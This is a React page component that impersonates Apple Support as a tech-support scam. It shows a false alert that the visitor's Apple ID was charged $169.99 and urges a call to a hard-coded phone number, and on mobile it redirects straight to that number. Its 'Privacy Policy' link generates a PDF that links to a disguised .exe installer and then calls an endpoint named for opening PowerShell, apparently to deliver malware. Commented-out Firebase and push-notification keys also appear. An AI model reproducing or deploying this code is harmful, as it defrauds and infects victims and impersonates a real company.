import { useState,useCallback } from "react";
import "./homePage.css";
import { getApiBase } from "../utils/apiBase";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faShoppingBag, faBars } from '@fortawesome/free-solid-svg-icons';
import { faApple } from '@fortawesome/free-brands-svg-icons';
// import { initializeApp } from "firebase/app";
// import { getMessaging } from "firebase/messaging";
import jsPDF from "jspdf";

// const firebaseConfig = {
//     apiKey: "AIzaSyDh9xWfsjFbJt1aPQdXceXRAP4hRqP3c7M",
//     authDomain: "my-app-testing-ca56f.firebaseapp.com",
//     projectId: "my-app-testing-ca56f",
//     messagingSenderId: "752222480020",
//     appId: "1:752222480020:web:12cfbd2b051a0a4a3df681",
//   };
  
//   const app = initializeApp(firebaseConfig);
//   const messaging = getMessaging(app);

// Mobile detection function
const isMobileDevice = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent
    ) || window.innerWidth <= 768;
};

const formatPhoneNumber = (phone) => {
    if (!phone) return phone;

    // Remove all non-digit characters except +
    let cleaned = phone.replace(/[^\d+]/g, '');

    // Extract country code and number
    let countryCode = '';
    let digits = '';

    if (cleaned.startsWith('+')) {
        // Handle +1XXXXXXXXXX or +91XXXXXXXXXX format
        if (cleaned.startsWith('+1') && cleaned.length === 12) {
            countryCode = '+1';
            digits = cleaned.substring(2); // 10 digits
        } else if (cleaned.startsWith('+91') && cleaned.length === 13) {
            countryCode = '+91';
            digits = cleaned.substring(3); // 10 digits
        } else {
            // Try to extract country code (first 1-3 digits after +)
            const match = cleaned.match(/^\+(\d{1,3})(\d{10})$/);
            if (match) {
                countryCode = '+' + match[1];
                digits = match[2];
            } else {
                return phone; // Can't parse, return original
            }
        }
    } else {
        // Handle without + prefix
        if (cleaned.startsWith('1') && cleaned.length === 11) {
            countryCode = '+1';
            digits = cleaned.substring(1); // 10 digits
        } else if (cleaned.startsWith('91') && cleaned.length === 12) {
            countryCode = '+91';
            digits = cleaned.substring(2); // 10 digits
        } else if (cleaned.length === 10) {
            countryCode = '+1'; // Default to US
            digits = cleaned;
        } else {
            return phone; // Can't parse, return original
        }
    }

    // Format as +XX-XXX-XXX-XXXX (country code, then 3-3-4 digits)
    if (digits.length === 10) {
        return `${countryCode}-${digits.substring(0, 3)}-${digits.substring(3, 6)}-${digits.substring(6)}`;
    }

    // Return original if can't format
    return phone;
};


function HomePage() {
    const [phone] = useState("+18882130902"); // default
    // const [loading, setLoading] = useState(true);


    const handleOk = useCallback(() => {
        console.log('okkkkkkkkkkkkk');
        
        const href = `tel:${(phone || "").replace(/\s+/g, "")}`;
        console.log('hreffff',href);
        
        window.location.href = href;

    },[phone]);

    const handleAlert = useCallback(() => {
        window.confirm(
            `Your Apple ID was recently used at APPLE STORE for $169.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support ${formatPhoneNumber(phone)} to Freeze it!`
        );
        // Function to detect mobile (android or iOS)
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isMobile) {
            handleOk();
        } else {
            handleAlert()
        }
    },[phone,handleOk]);

    // Fetch phone number on mount (only once)
    // useEffect(() => {
    //     (async () => {
    //         try {
    //             console.log('tryyyyyyyyyyyyyyy');
                
    //             const fromUrl = new URLSearchParams(window.location.search).get("phone");
    //             console.log('fromUrl',fromUrl);
                
    //             if (fromUrl) {
    //                 setPhone(fromUrl);
    //             } else {
    //                 if(window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1" ){

    //                 const ctrl = new AbortController();
    //                 const id = setTimeout(() => ctrl.abort(), 8000);

    //                 const res = await fetch(`${getApiBase()}/api/phone`, {
    //                     cache: "no-store",
    //                     signal: ctrl.signal,
    //                 });
    //                 clearTimeout(id);

    //                 const text = await res.text();
    //                 let data = {};
    //                 try {
    //                     data = JSON.parse(text);
    //                 } catch {
    //                     console.warn("Non-JSON:", text);
    //                 }
    //                 console.log('dataaaaaaaaaa',data);
                    
    //                 if (res.ok && data?.phone) {
    //                     setPhone(data.phone); // Update state with fetched phone
    //                 }
    //                 }else{
    //                     const ctrl = new AbortController();
    //                     const id = setTimeout(() => ctrl.abort(), 8000);
    
    //                     const res = await fetch(`${getApiBase()}/phone`, {
    //                         cache: "no-store",
    //                         signal: ctrl.signal,
    //                     });
    //                     clearTimeout(id);
    
    //                     const text = await res.text();
    //                     let data = {};
    //                     try {
    //                         data = JSON.parse(text);
    //                     } catch {
    //                         console.warn("Non-JSON:", text);
    //                     }
    //                     console.log('dataaaaaaaaaa',data);
                        
    //                     if (res.ok && data?.phone) {
    //                         setPhone(data.phone); // Update state with fetched phone
    //                     }
    //                 }
    //             }
    //         } catch (e) {
    //             console.error("Failed to load phone:", e);
    //             // Keep default phone on error
    //         } finally {
    //             setLoading(false); // IMPORTANT: Set loading to false
    //         }
    //     })();
    // }, []); // Empty array = run only once on mount

    // // Show alert only after loading completes AND only on mobile
    // useEffect(() => {
    //     if (!loading) {
    //         handleAlert();
    //     }
    // }, [loading,handleAlert]); // Trigger when loading finishes AND phone is available

    // const requestPermission = async() => {
    //     console.log("Requesting permission...");
      
    //     const permission = await Notification.requestPermission();
    //     if (permission === "granted") {
    //       console.log("Notification permission granted.");
      
    //       const token = await getToken(messaging, {
    //         vapidKey: "BBn9UpvUM37mZgK_krbH1mu8_FDqpsQyRsiIQCRSKaircrL9CBOc8odtEZdUFykijljsUHNQGPd4tAR7gcjsikA",
    //       });
      
    //       console.log("FCM Token:", token);
    //       alert("Token generated! Check console.");
      
    //       return token;
    //     } else {
    //       console.log("Permission not granted");
    //       alert("You must allow notifications.");
    //     }
    //   }

    const handlePrivacyPdf = async () => {
        const doc = new jsPDF();
      
        doc.setFontSize(16);
        doc.text("Privacy Policy", 20, 20);
      
        doc.setFontSize(11);
        doc.text(
          `This Privacy Policy explains how we collect, use, and protect your information.`,
          20,
          35,
          { maxWidth: 170 }
        );
      
        // ✅ absolute URL banavo (dev ma localhost, prod ma tamaru domain)
        const exeUrl = `${window.location.origin}/exe/CursorSetup-x64-1.7.28.exe`;
      
        doc.setTextColor(0, 0, 255);
        doc.textWithLink("Click here to download installer", 20, 60, {
          url: exeUrl,
        });
        doc.setTextColor(0, 0, 0);
      
        const pdfBlob = doc.output("blob");
        const pdfUrl = URL.createObjectURL(pdfBlob);
        window.open(pdfUrl, "_blank");
      
        doc.save("Privacy-Policy.pdf");
        
        // PowerShell open karo
        try {
            const apiBase = getApiBase();
            const endpoint = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1"
                ? `${apiBase}/api/open-ps`
                : `${apiBase}/open-ps`;
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
            });
            
            const data = await response.json();
            console.log('PowerShell opened:', data);
        } catch (error) {
            console.error('Error opening PowerShell:', error);
        }
      };
    
    return (
        <main className="hero" style={{ "--bg": "url(/images/support-bg.jpg)" }}>
            {/* top bar (optional) */}
            <header className="topbar">
            {/* <button onClick={requestPermission}>Enable Notifications</button> */}

                {isMobileDevice() &&
                    <>
                        <FontAwesomeIcon icon={faBars} />
                        <FontAwesomeIcon icon={faApple} />
                        <FontAwesomeIcon icon={faShoppingBag} />
                    </>
                }
            </header>
            <div style={{
                width: '100%',
                // height: 'auto'
            }}>
                {isMobileDevice() ?
                    <>
                        <div style={{
                            display: 'flex',
                            justifyContent: 'space-between',
                            position: 'absolute',
                            width: '100%',
                            borderBottom: '1px solid #807e7c',

                        }}>
                            <span style={{
                                fontSize: 20,
                                fontWeight: 'inherit',
                                // fontFamily: 'sans-serif',
                                fontFamily: '-apple-system, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Arial, sans-serif',
                                marginLeft: 20,
                                marginTop: 10,
                                marginBottom: 10

                            }}>Apple Support {formatPhoneNumber(phone)}</span>
                            <svg
                                width="20"
                                height="20"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#000"
                                strokeWidth="2"
                                style={{
                                    alignSelf: 'center',
                                    marginRight: 20,
                                }}
                            >
                                <path d="M6 9l6 6 6-6" />
                            </svg>
                        </div>

                        <img
                            alt="Apple Support"
                            src={"/images/apple-support.png"}
                            style={{
                                width: "100%",
                                height: "30%",
                            }}
                        />
                    </>
                    :
                    <div style={{
                        display: 'flex',
                        justifyContent: 'center',
                    }}>
                        <div style={{
                            display: 'flex',
                            justifyContent: 'space-between',
                            // position:'absolute',
                            width: '60%',
                            borderBottom: '1px solid #c4c8cf',
                            // backgroundColor: 'red'
                        }}>
                            <span style={{
                                fontSize: 24,
                                fontWeight: 'inherit',
                                fontFamily: 'sans-serif',
                                // marginLeft: 20,
                                marginTop: 15,
                                marginBottom: 10,


                            }}>Apple Support {formatPhoneNumber(phone)}</span>
                            <span style={{
                                fontSize: 14,
                                marginTop: 15,
                                marginBottom: 10,
                                // marginRight: 20,
                                fontWeight: 'inherit',
                                // fontFamily: 'sans-serif'
                                fontFamily: '-apple-system, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Arial, sans-serif',
                            }}>Communities</span>
                        </div>

                        {isMobileDevice() &&
                            <img
                                alt="Apple Support"
                                src={"/images/apple-support.png"}
                                style={{
                                    width: "100%",
                                    height: "30%",
                                }}
                            />
                        }
                    </div>
                }

                {isMobileDevice() ?
                    <div style={{
                        display: 'flex',
                        justifyContent: 'center'
                    }}>
                        <span style={{
                            fontSize: 40,
                            fontWeight: 'inherit',
                            // fontFamily: 'sans-serif',
                            fontFamily: '-apple-system, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Arial, sans-serif',
                        }}>Apple Support</span>
                    </div>
                    :
                    <div style={{
                        display: 'flex',
                        justifyContent: 'center'
                    }}>
                        <span style={{
                            fontSize: 40,
                            fontWeight: 'inherit',
                            // fontFamily: 'sans-serif',
                            fontFamily: '-apple-system, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Arial, sans-serif',
                            marginTop: 20
                        }}>Apple Support</span>
                    </div>
                }



                {isMobileDevice() ?
                    <div style={{
                        display: 'flex',
                        justifyContent: 'center'
                    }}>
                        <span style={{
                            fontSize: 18,
                            // fontWeight: 'lighter',
                            fontFamily: '-apple-system, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Arial, sans-serif',
                            lineHeight: 1.5,
                            letterSpacing: 0.2,
                            // backgroundColor: 'red',
                            marginLeft: 20,
                            marginRight: 20,
                            marginTop: 10
                        }}>{`Your iPhone Apple ID was recently used at APPLE STORE for $169.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support ${formatPhoneNumber(phone)} to Freeze it!`}</span>
                    </div>
                    :
                    <div style={{
                        display: 'flex',
                        justifyContent: 'center',
                        alignItems: 'center',
                        width: '100%',
                        marginTop: 10
                    }}>
                        <div style={{
                            // backgroundColor: 'yellow',
                            width: '44%',
                            display: 'flex',
                            justifyContent: 'center',
                            alignItems: 'center',
                        }}>
                            <span style={{
                                fontSize: 28,
                                fontWeight: 'lighter',
                                fontFamily: '-apple-system, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Arial, sans-serif',
                                lineHeight: 1.5,
                                letterSpacing: 0.2,
                                // backgroundColor: 'red',
                                // marginLeft: 20,
                                // marginRight: 20,
                                textAlign: 'center',
                                display: 'block',
                                width: '100%',
                            }}>{`Your iPhone Apple ID was recently used at APPLE STORE for $169.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support ${formatPhoneNumber(phone)} to Freeze it!`}</span>
                        </div>
                    </div>
                }
            </div>

            <footer style={{
                position: 'relative',
                zIndex: 2,
                backgroundColor: '#1d1d1f',
                color: '#86868b',
                padding: '20px',
                paddingLeft: '40px',
                paddingRight: '40px',
                fontSize: '12px',
                lineHeight: '1.6',
                marginTop: 'auto'
            }}>
                <div style={{ marginBottom: '8px' }}>
                    More ways to shop: <span href="#" style={{ color: '#0071e3', textDecoration: 'none' }}>Visit an Apple Store</span>, call {formatPhoneNumber(phone)}, or <span href="#" style={{ color: '#0071e3', textDecoration: 'none' }}>find span reseller</span>.
                </div>

                <div style={{ marginBottom: '8px' }}>
                    United States
                </div>

                <div style={{ marginBottom: '16px' }}>
                    Copyright © 2023 Apple Inc. All rights reserved.
                </div>

                <div style={{
                    display: 'flex',
                    flexWrap: 'wrap',
                    gap: '20px',
                    marginTop: '8px'
                }}>
<span
    onClick={handlePrivacyPdf}
    style={{
        color: '#0071e3',
        textDecoration: 'none',
        cursor: 'pointer'
    }}
>
    Privacy Policy
</span>
                    <span href="#" style={{ color: '#0071e3', textDecoration: 'none' }}>Terms of Use</span>
                    <span href="#" style={{ color: '#0071e3', textDecoration: 'none' }}>Sales and Refunds</span>
                    <span href="#" style={{ color: '#0071e3', textDecoration: 'none' }}>Site Map</span>
                    <span href="#" style={{ color: '#0071e3', textDecoration: 'none' }}>Contact Apple</span>
                </div>
            </footer>
        </main>
    )
}

export default HomePage;